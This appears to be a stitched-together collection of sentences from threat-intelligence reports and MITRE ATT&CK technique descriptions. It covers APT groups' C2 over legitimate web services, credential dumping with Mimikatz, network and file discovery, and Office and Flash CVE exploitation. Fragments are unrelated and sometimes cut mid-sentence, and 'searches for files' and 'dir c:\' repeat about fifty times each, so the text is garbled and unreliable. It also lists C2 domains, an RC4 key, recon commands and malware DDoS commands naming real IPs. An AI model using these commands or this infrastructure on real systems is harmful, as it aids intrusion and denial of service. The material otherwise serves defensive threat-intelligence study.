Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)

Code signing certificates may be used to bypass security policies that require signed code to execute on a system. 
Figure 9: Example of callback Earlier versions of UPPERCUT used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2
If the <flag> field of the message header is greater than one, the XOR key used to encrypt message bodies is iterated in reverse when encrypting and decrypting messages
A 256-bit AES session key is generated and used to encrypt both message headers and bodies separately
Initially, the key is sent to the C2 server with the entire message and headers encrypted with the RSA key exchange algorithm
Based upon the instructional guide and the provided tools, this package appears consistent with the methodologies FireEye outlined in their research on how these attacks were executed, including specific details such as the use of ICAP via a proxy passthrough, in this case specifically squid, and using certbot to create a Let’s Encrypt SSL certificate
The backdoor's infrequent beaconing, traffic obfuscation, extensive encryption and use of geographically local, legitimate websites for command and control (C2) make identification of its network traffic difficult
Encrypting communications using AES and RSA public key cryptography   5
The AES key is unique for each communication and is encrypted with one of two RSA public keys
Figure 12 and Figure 13 show the RSA keys used in FELIXROOT, and Figure 14 shows the AES encryption parameters
Figure 19. Scrambling ‘Mac OSX 10.12’  Encryption  The scrambled byte sequence is passed onto the constructor of the class Packet::Packet, which creates a random AES256 key and encrypts the buffer with this key
It first grabs an encrypted blob stored away in a global variable and pulls out 381 bytes of this encrypted data:  The standard win32 api CryptDecrypt uses rc4 to decrypt this blob into a hardcoded c2, url path, and url parameters listed below with a simple 140-bit key “\x8B\xFF\x55\x8B\xEC\x83\xEC\x50\xA1\x84\x18\x03\x68\x33\xC9\x66\xF7\x45\x10\xE8\x1F\x89\x45\xFC\x8B\x45\x14\x56″
These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949
Command and Control Infrastructure: Compromised servers, messaging platforms, and cloud service providers to avoid detection
In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process
Some APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, Google, and Pastebin for initial C2 communications
This RAT communicates with 5.189.145.248, a command and control (C2) IP address that this group has used previously with other malware, including DarkComet and NJRAT
BRONZE UNION appears to use a combination of self-registered IP addresses and commercial VPN services in its command and control (C2) and operational infrastructure
LOWBALL abuses the Dropbox cloud storage service for command and control (CnC)
The attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts.[2][3] A Cyber Campaign Likely Intended to Monitor Hong Kong Media During a Period of Crisis The threat group has previously used newsworthy events as lures to deliver malware.[4] They have largely targeted organizations involved in financial, economic and trade policy, typically using publicly available RATs such as Poison Ivy, as well some non-public backdoors.[5] The group started targeting Hong Kong media companies, probably in response to political and economic challenges in Hong Kong and China
Firstly, the Trojan will use the following regular expression to determine if the C2 server wishes to cancel the C2 communications:       216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com     Additionally, the RogueRobin Trojan uses the regular expressions in Table 3 to confirm that the DNS response contains the appropriate data for it to extract information from
The string is formatted as “<domain list>|<minimum query size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<maximum requests>|<query types>|<hibridMode>|<current query mode>”   ^slp Sets the sleep and jitter values   ^exit Exits the Trojan    Table 5 Commands available within the C# variant of RogueRobin Using Google Drive for C2 A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C# variant is the x_mode
This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API
To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account
Figure 4 x_mode command and new line delimited settings As seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive
Variable Name Description   gdu Google Drive URL for downloading files to the Google Drive account   gduu Google Drive URL for uploading files to the Google Drive account   gdue Google Drive URL for updating a file on the Google Drive account   gdo2t Google Drive URL used to get the OAUTH access_token   client_id The client_id for the OAUTH application   cs The client_secret for OAUTH   r_t The refresh_token for OAUTH    Table 6 Variables used to store settings needed to use Google Drive as a C2 To obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data
Figure 6 Hardcoded Google Drive URL used in RogueRobin sample When the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive
To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c.<C2 domain> The Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier
Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure
The Delphi variant of Cannon does not use legitimate web-based email services for its C2 communications, instead opting to use email accounts at an actor owned domain, ambcomission[.]com
Then pastebin.com, github.com, mailimg.com, upload.cat, dev-point.com and pomf.cat were used as channels for the different malware stages before achieving a full RAT implementation, which then communicates with the corresponding C2 server
However, the attacks different stages were hosted on a variety of free sites such as Mailimg, Github, Pastebin, dev-point.co, a.pomf.cat, and upload.cat
The command index table and command handler address table.  Implant Capabilities Based on the responses received from the control server, the malware can carry out the following malicious tasks:  Recursively generate a list of files in a directory and send to the control server Terminate a specific process
The actor has the following demonstrated capabilities:To include exploits (for Hangul and Microsoft Office) in its workflows.To modify its campaigns by splitting the payload in to multiple stages To use compromised web servers or legitimate cloud based platforms
Here is a list of the platforms used by this variant: Twitter, Yandex and Mediafire
The majority of documents used the name “gerry knight” for the author field in the document metadata, and the embedded macros largely used direct IP connections to command and control (C2) servers rather than using domain names
It has historically leveraged legitimate third-party websites to host the malware’s command and control (C2) information, acting as “dead drops”
This tactic uses public web services to host content that contains encoded commands that are decoded by the malware
This can be seen in the following images taken from hxxp:// feeds.rapidfeeds[.]com/88604/, which is one of the dead drop resolvers we encountered in this sample:  Figure 7 Dead drop resolver used by BADNEWS   In order to decrypt this data, the authors have included additional steps from previous versions
One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server
Some of the targeted apps were:    Whatsapp  YouTube Video Downloader  Google Update   Instagram  Hack Wifi   AirDroid   WifiHacker     Facebook   Photoshop   SkyTV     Hotstar  Trump Dash   PokemonGo  With many more to come
Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal
An increasingly popular tactic by threat actors is to use legitimate hosting services like Google Cloud or CloudFlare for their payload and C2  infrastructure, making it much more difficult to safely block IPs
Hidden Content The primary command and control location used in this campaign is hosted on a blog on blogspot[.]com, which enables the threat actors to hide their malicious content behind a legitimate service
In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com
five threads are for forwarding collected data to four cloud services (Box, Dropbox, Pcloud and Yandex). When uploading stolen data to a cloud service
The group also used GitHub as a repository for tools that it downloaded post-compromise.
Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'
Once inside the network of a hospitality company, APT28 sought out machines that controlled both guest and internal Wi-Fi networks. No guest credentials were observed being stolen at the compromised hotels; however, in a separate incident that occurred in Fall 2016, APT28 gained initial access to a victim’s network via credentials likely stolen from a hotel Wi-Fi network.  Upon gaining access to the machines connected to corporate and guest Wi-Fi networks, APT28 deployed Responder
At a high-level, their targeting of financial organizations and subsequent heists have followed the same general pattern:   Information Gathering: Conducted research into an organization’s personnel and targeted third party vendors with likely access to SWIFT transaction systems to understand the mechanics of SWIFT transactions on victim networks (Please note: The systems in question are those used by the victim to conduct SWIFT transactions
Host enumeration and lateral movement After gaining an initial foothold in a compromised environment, the threat actors quickly identify and explore accessible systems
In one example, BRONZE UNION actors leveraged initial web shell access on Internet-facing systems to conduct internal reconnaissance, including domain enumeration and network state, via ipconfig, net use, net user, and net view commands
The Trojan checks to see if the result of this query returned a class with more than 0 elements, which would most likely be true in a non-virtual environment
The primary difference was that this sample was encrypted and password protected, requiring the victim to enter in a password which was likely provided by the adversary to view the document
This technique allows them to map network resources and make lateral movements inside the network, landing in the perfect machine to match the attacker’s interest
(Source: Dell SecureWorks) Over a few days' span, the threat actors install remote access tools on additional systems based upon the results of the network reconnaissance
Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039).

Adversaries may also analyze data from local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.

Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  

The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary file affixed with 'spdata'
APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets
During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump
APT40 leverages custom credential theft utilities such as HOMEFRY, a password dumper/cracker used alongside the AIRBREAK and BADFLICK backdoors
NetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords including:  Login passwords of remote computers on LAN
Our observation of related actions here:    u ps start password stealing (Windows)   Ps_mps/ps_hwi start start password stealing (Linux, MIPS,  ARM)   uper_mps/uper_hwi start rewrite hook module with a new version and launch it (Linux, MIPS, ARM)   Nm_mps/nm_hwi start  –ban -middle Scan ports and retrieve banners on the router subnet  (Linux, MIPS,  ARM)   U fsget * 7 *.docx, *.pdf, *.doc * search for docs with the given filetypes (Windows)   S sinfo retrieve information on installed programs and launch commands: systeminfo, tasklist, ipconfig, netstat, route print, tracert www.google.com (Windows)   weap_mps/weap_hwi host188.128.123.52 port[25,26,110,465,995]  typetcpconnect DDoS on 188.128.123.52 (Linux, MIPS,  ARM)   weap_mps/weap_hwi  typesynflood port80 cnt100000 spdmedium host212.175.109.10 DDoS on 212.175.109.10 (Linux, MIPS,  ARM)    The issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM devices. We want to pay special attention to the DDoS commands meant for these routers
The information contained in this data dump include:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group
The datasets included:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Script to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  We analyzed each type of dataset other than the documents containing detailed information on alleged OilRig operators and they remain consistent with previously observed OilRig tactics, techniques, and procedures (TTPs)
In total, nearly 13,000 sets of credentials are included in the data dump
The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz
In addition to these tools, we believe OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using traditional credential harvesting toolkits as we discussed in the Striking Oil blog published in September 2017
It appears to us that one organization had its entire Active Directory dumped out, making up most of the credentials we found in the data dump
We are unable to confirm if all of these stolen credentials are indeed valid sets of credentials, but based upon previously observed activity, timestamping, and known behaviors, it is highly probable that these credentials were or may still be valid
Assuming the lists of credentials are valid, the mass collection confirms our hypothesis that the OilRig group maintains a heavy emphasis on credential based attacks along with the other types of attacks they deploy
When entered, these credentials are then sent to the C2 server, which allows DarkHydrus to collect the user account credentials
Credential Harvesting Attack On June 24, 2018, Unit 42 observed DarkHydrus carrying out a credential harvesting attack on an educational institution in the Middle East
Figure 2 Employee survey displayed after credential theft The November 2017 document displays a password handover document after credential theft occurs, as seen in Figure 3
Figure 3 Password handover form displayed after credential theft The infrastructure used in these credential harvesting attacks used the domain 0utl00k[.]net, which at the time of the attacks resolved to 107.175.150[.]113 and 195.154.41[.]150
Figure 6 Authentication dialog box with fake credentials entered On the C2 server, we observed Phishery receiving the inbound request and capturing the credentials, as seen in Figure 7
Vault was implemented in Windows 7, it contains any sensitive data (like the credentials) of Internet Explorer
The malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, NTLM hashes, and malware version for each login session
This private data includes stored passwords, login credential information from Web browsers, and a variety of cryptocurrency wallets
Alerts for credential theft tools and privileged account lockouts should be investigated
(Source: Dell SecureWorks)   TG-3390 actors have also used the following publicly available tools:  Windows Credential Editor (WCE) — obtains passwords from memory gsecdump — obtains passwords from memory winrar — compresses data for exfiltration nbtscan — scans NetBIOS name servers  Tactics, techniques, and procedures Incident response engagements have given CTU researchers insight into the tactics TG-3390 employs during intrusions
15 Database dump Decoded, it reveals a detailed log of each affected machine
Mimikatz to obtain credentials.

Also, the use of the  mimikatz and pwdump tools suggests the adversary attempts to dump credentials on compromised systems
It was heavily modified, with almost all original code stripped out aside from its sekurlsa::logonpasswords credential stealing feature
Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.

Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

Domains The RoyalCli backdoor was attempting to communicate to the following domains:  News.memozilla[.]org video.memozilla[.]org  The BS2005 backdoor utilised the following domains for C2:  Run.linodepower[.]com Singa.linodepower[.]com log.autocount[.]org  RoyalDNS backdoor was seen communicating to the domain:  andspurs[.]com  Possible linked APT15 domains include:  Micakiz.wikaba[.]org cavanic9[.]net ridingduck[.]com zipcodeterm[.]com dnsapp[.]info   Published date:  10 March 2018   Written by:  Rob Smallridge
In order to extend the lifespan of the domains in case one or more are blacklisted, there are twelve different C2 domains that xparis() can be set to
Indicators of Compromise (IoCs)    C&C servers    Ssl[.]arkouthrie[.]com   s3[.]hiahornber[.]com   widget[.]shoreoa[.]com       SHA256   Delivery document (W2KM_OCEANLOTUS.A): 2bb855dc5d845eb5f2466d7186f150c172da737bfd9c7f6bc1804e0b8d20f22a   Dropper (OSX_OCEANLOTUS.D): 4da8365241c6b028a13b82d852c4f0155eb3d902782c6a538ac007a44a7d61b4   Backdoor (OSX_OCEANLOTUS.D): 673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f   The post New MacOS Backdoor Linked to OceanLotus Found appeared first on
Additionally malware reports itself to its hardcoded command and control servers and established a backdoor connection, so the attacker may have a permanent remote connection
Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.
Business and government personnel who are traveling, especially in a foreign country, often rely on systems to conduct business other than those at their home office, and may be unfamiliar with threats posed while abroad
These files are downloaded to a directory (C:\Users\Public\Libraries\tempsys) on the infected machine by Bxaki() and xparis()
In this particular case in 2013, the config file included an unknown plugin set, aside from the usual ‘ddos’ plugin listing
The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a file extension from the following list with no parameters: gif, jpg, png, htm, html, php
The body of the POST request may contain files contained in the cabinet format
It should be noted that the Win32/KillDisk.NBB variant used against media companies is more focused on destroying various types of files and documents
Figure 3 – A list of file extensions targeted for destruction by new variant of KillDisk component As well as being able to delete system files to make the system unbootable – functionality typical for such destructive trojans – the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems
This is the only instance we observed where a hardcoded Google Drive URL was included in RogueRobin, which may suggest that the author may have overlooked this during testing
HD Creates a file in the Temp path and names it “hd” + PCID then invokes another program module named hd.test1 to identify logical drives
Implant directory contained in the malicious Flash file
Otherwise, it runs a search for the “/bin/rsyncd” string within the files found in the /etc/ folder
watch/?   search/?  find/?    results/? open/?    search/?  close/?   The “ai” value stands for the payload title
DRIVE Lists the logical drives and the type, as well the total/free space of the fixed devices
Command Description   !Dir Lists the contents of a specified directory   !Drives Enumerates the storage drives attached to the system and their respective type
The dropped files are either in the root of the “ProgramData” folder or in a subdirectory
The file names may vary from one version of the malware to another
In one version of the malware, the code checks if the “ProgramData” folder has folders or files with the keywords “Kasper“, “Panda“, or “ESET“
It mimics the icon Finder usually applies to JPEG or text files to increase the likelihood the recipient will double-click the file
Figure 7: Property list file in LaunchAgents directory To camouflage the location of the malicious file, Keydnap replaces argv[0] with /usr/libexec/icloudsyncd –launchd netlogon.bundle
.iqy files are simple text files containing a URL which are opened by default by Excel
The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files
Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files
4 Upload edg499.dat, which includes the list of interesting files
Since it is a very long term group, some victims may be impossible to identify now
These platforms may not be well maintained and may break intermittently
PHOTO: a DLL backdoor also reported publicly as “Derusbi”, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files
This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime
Included in the directories were a combination of files leveraged in targeted attacks mentioned above against nation states
Open directory listing of hxxp://stevemike-fireforce[.]info/ Based on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in use
High Commissioner of Bangladesh Pakistan eying Sukhoi-35 fighter planes as part of defense deal from Russia 2018.143 PG COURSE IN 2018-2021 BATCH India Bangladesh and Pakistan Press Release on Observance of Historic Mujibnogor Dibosh by Pakistan Mission on 17 April 2018 Afghan Bomb Blast report by ISI USAJOBS Daily Saved Search Results for New GS15 for 3/30/2018 How Rigging take place in Senate Elections in Pakistan Afghan Terrorist group details ISI Restricted113 1971 Liberation War Freedom Fighters in Pakistan Army Custody Database  Additionally, the following filenames were witnessed in these attacks (spelling and grammar mistakes included):  Liberation Freedom Fighter.xlam NSC details of participants.xlam Raw Sect Vikram report on Pak Army Confidential.doc USA Immagration Policy for Families.ppam doc CV FM.doc doc Sukhoi35 deal report.doc Nominal Roll.doc Press Release 17 April.doc Afghan Blast report by ISI.doc Rigging in Pakistan Senate.doc Afghan Terrorist group report.doc    The payloads for these attacks varied in malware family
With the exception of the ‘Speed’ method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the following list:    ETransaksi.Speed ETransaksi.diomadnfagaghagh ETransaksi.fjcsERIfjfiojsGHIsdifjksi ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl ETransaksi.FJaioefgkaoeK    The last two methods in the chain carry out a majority of the first payload’s functionality
Hashes For a list of all hashes of malware encountered during this campaign, please refer to the following file
17 Complete List of Malware Files  Fig
17-3 Function names To target specific victims, Astaroth is locale aware; any attempts to run the malware without locale spoofing will result in failed downloads and the inability to run the .dll files
119 readFiles Obtains file information on a file or a folder, and supports a “*” wildcard and recursive file list
Get Directory Information The malware gets information for the provided directory address using the following WINAPI calls:
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
searches for files
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
dir c:\
Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)
2, 2018, we published a blog detailing the use of an Adobe Flash zero-day vulnerability (CVE-2018-4878) by a suspected North Korean cyber espionage group that we now track as APT37 (Reaper)
Observed vulnerabilities include:  CVE-2012-0158  CVE-2017-0199  CVE-2017-8759  CVE-2017-11882       Figure 2: APT40 attack lifecycle  Establish Foothold APT40 uses a variety of malware and tools to establish a foothold, many of which are either publicly available or used by other threat groups
On October 10, 2017, Kaspersky Lab’s advanced exploit prevention systems identified a new Adobe Flash zero day exploit used in the wild against our customers
We are also highly confident that BlackOasis was also responsible for another zero day exploit (CVE-2017-8759) discovered by FireEye in September 2017.  The FinSpy payload used in the current attacks (CVE-2017-11292) shares the same command and control (C2) server as the payload used with CVE-2017-8759 uncovered by FireEye
Some lure documents used in these attacks are shown below: Decoy documents used in BlackOasis attacks To summarize, we have seen BlackOasis utilizing at least five zero days since June 2015:  CVE-2015-5119 – June 2015 CVE-2016-0984 – June 2015 CVE-2016-4117 – May 2016 CVE-2017-8759 – Sept 2017 CVE-2017-11292 – Oct 2017  Attacks Leveraging CVE-2017-11292 The attack begins with the delivery of an Office document, presumably in this instance via e-mail.  Embedded within the document is an ActiveX object which contains the Flash exploit
What does it mean for everyone and how to defend against such attacks, including zero-day exploits? For CVE-2017-11292 and other similar vulnerabilities, one can use the killbit for Flash within their organizations to disable it in any applications that respect it.  Unfortunately, doing this system-wide is not easily done, as Flash objects can be loaded in applications that potentially do not follow the killbit
This document exploited a newer vulnerability, CVE-2017-0199
This change is because Group 123 did not target South Korea during this campaign and Microsoft Office is standard in the rest of the world.Infection VectorsThe attackers exploited CVE-2017-0199 in order to download and execute a malicious HTA document inside of Microsoft Office
Even when we observed LuckyMouse using weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors since December 2017), we can´t prove they were related to this particular attack
This time, weaponized lure documents claiming to contain seminar information on environmental protection were observed exploiting known Microsoft Office vulnerabilities CVE-2017-0199 and CVE-2017-11882 to drop and execute the backdoor binary on the victim’s machine
In this campaign, we observed threat actors exploiting CVE-2017-0199 and CVE-2017-11882 to distribute malware
Conclusion CVE-2017-0199 and CVE-2017-11882 are two of the more commonly exploited vulnerabilities that we are currently seeing
Figure 2: Zyklon attack flow Infection Techniques CVE-2017-8759 This vulnerability was discovered by FireEye in September 2017, and it is a vulnerability we have observed being exploited in the wild
Figure 3: Embedded URL in OLE object CVE-2017-11882 Similarly, we have also observed actors leveraging another recently discovered vulnerability (CVE-2017-11882) in Microsoft Office
In many cases, additional stealers, RATs, and other malware were observed being hosted on the same web servers.Analysis of HawkEye Reborn The campaign starts with sending the aforementioned Excel sheets that exploit the well-known CVE-2017-11882 vulnerability, an arbitrary code execution bug in Microsoft Office
Less than a week after Microsoft issued a patch for CVE-2017-11882 on Nov
14, 2017, FireEye observed an attacker using an exploit for the Microsoft Office vulnerability to target a government organization in the Middle East
In this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER
CVE-2017-11882: Microsoft Office Stack Memory Corruption Vulnerability CVE-2017-11882 affects several versions of Microsoft Office and, when exploited, allows a remote user to run arbitrary code in the context of the current user as a result of improperly handling objects in memory
Figure 3: CVE-2017-11882 and POWRUNER attack sequence  The malicious .rtf file exploits CVE-2017-11882
An RTF, an MSI file, a .NET Wrapper and two stages of Shellcode walk into a bar… Our journey begins with an RTF file named “New Salary Structure 2017.doc”, which exploits CVE-2017-0199
Second, the threat actors exploit CVE-2017-8570 to achieve code execution via a malicious “scriptlet” file, or .sct file, which is also embedded in the malicious RTF document
Older documents used by Patchwork focused on the CVE-2017-0261 vulnerability, however in late January 2018 when, paradoxically, newer documents abandoned this vulnerability to attack the older CVE-2015-2545 vulnerability
Try to exploit the following Remote Code Execution vulnerabilities in the targeted servers:  a) CVE-2012-0874: JBoss Enterprise Application Platform Multiple Security Bypass Vulnerabilities b) CVE-2010-1871: JBoss Seam Framework remote code execution c) JBoss AS 3/4/5/6: Remote Command Execution (exploit) d) CVE-2017-10271: Oracle WebLogic wls-wsat Component Deserialization RCE e) CVE-2018-2894: Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware
Attack chain of Tropic Trooper’s operations Here’s a summary of the attack chain of Tropic Trooper’s recent campaigns:  Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in Microsoft Office’s Equation Editor (EQNEDT32.EXE)
We believe the adversary exploited a recently vulnerability in Microsoft SharePoint tracked by , which is a remote code execution vulnerability used to compromise the server and eventually install a webshell
The attack involved the new HAWKBALL backdoor being delivered via well-known Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802.
Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

Several types exist:

### Browser-based Exploitation

Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

### Office Applications

Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

### Common Third-party Applications

Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.
Exploited Vulnerabilities: Frequent exploitation of vulnerabilities in Hangul Word Processor (HWP), as well as Adobe Flash
APT40 leverages exploits in their phishing operations, often weaponizing vulnerabilities within days of their disclosure
Leveraging data from Kaspersky Security Network, we identified two other similar exploit chains used by BlackOasis in June 2015 which were zero days at the time.  Those include CVE-2015-5119 and CVE-2016-0984, which were patched in July 2015 and February 2016 respectively.  These exploit chains also delivered FinSpy installation packages
Deploying a multi-layered approach including access policies, anti-virus, network monitoring and whitelisting can help ensure customers are protected against threats such as this.  Users of Kaspersky products are protected as well against this threat by one of the following detections:  PDM:Exploit.Win32.Generic HEUR:Exploit.SWF.Generic HEUR:Exploit.MSOffice.Generic  More information about BlackOasis APT is available to customers of Kaspersky Intelligence Reporting Service
Exploitation of this vulnerability allows an attacker to escalate privileges on the affected system
All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash
Year  Country  Industry  Malware  2014  Vietnam  Network Security  WINDSHIELD  2014  Germany  Manufacturing  WINDSHIELD  2015  Vietnam  Media  WINDSHIELD  2016  Philippines  Consumer products  KOMPROGO WINDSHIELD SOUNDBITE BEACON   2016  Vietnam  Banking  WINDSHIELD  2016  Philippines  Technology Infrastructure  WINDSHIELD  2016  China  Hospitality  WINDSHIELD  2016  Vietnam  Media  WINDSHIELD  2016  United States  Consumer Products  WINDSHIELD PHOREAL BEACON SOUNDBITE  Table 1: APT32 Private Sector Targeting Identified by FireEye APT32 Interest in Political Influence and Foreign Governments In addition to focused targeting of the private sector with ties to Vietnam, APT32 has also targeted foreign governments, as well as Vietnamese dissidents and journalists since at least 2013
APT32 regularly used stealthy techniques to blend in with legitimate user activity:  During one investigation, APT32 was observed using a privilege escalation exploit (CVE-2016-7255) masquerading as a Windows hotfix
Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal
